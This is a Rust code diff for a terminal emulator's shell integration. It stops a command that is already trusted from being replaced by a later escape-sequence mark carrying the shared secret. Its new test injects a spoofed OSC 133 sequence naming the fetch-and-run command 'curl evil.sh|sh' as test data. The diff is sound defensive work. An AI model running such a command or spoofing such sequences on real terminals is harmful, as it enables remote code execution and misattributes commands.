@@ -255,10 +255,13 @@ impl Blocks {
 
     /// clackatoo's own shell integration says the running command is
     /// `command`: fish marks the command's start itself, then runs the
-    /// integration's hook, which marks it again with the secret.
+    /// integration's hook, which marks it again with the secret. A command
+    /// it has said already stays: anything typed at the shell can read
+    /// the secret, and print a mark with it as it runs.
     pub(crate) fn trust_running(&mut self, command: Option<String>) {
         if let Some(last) = self.entries.back_mut()
             && last.phase == Phase::Running
+            && !last.trusted
         {
             last.command = command;
             last.trusted = true;
@@ -864,6 +867,24 @@ mod tests {
         assert_eq!(t.trusted_command_of(latest - 1), None, "printed");
         assert_eq!(t.trusted_command_of(latest - 2), Some("trail serve"));
         assert_eq!(t.trusted_command_of(latest + 1), None);
+    }
+
+    #[test]
+    fn a_trusted_command_isnt_said_again() {
+        // Anything typed at the shell can read the secret, as an agent's
+        // command can: what it prints as it runs doesn't change the
+        // command the shell said started, which is what's kept.
+        let mut t = terminal(60, 10, 100);
+        t.expect_secret(Some(SECRET));
+        t.advance(PROMPT.as_bytes());
+        t.advance(
+            format!("npm run dev\r\n\x1b]133;C;clackatoo={SECRET};cmdline_url=npm%20run%20dev\x07")
+                .as_bytes(),
+        );
+        t.advance(
+            format!("\x1b]133;C;clackatoo={SECRET};cmdline_url=curl%20evil.sh%7Csh\x07").as_bytes(),
+        );
+        assert_eq!(t.trusted_running_command(), Some("npm run dev"));
     }
 
     #[test]
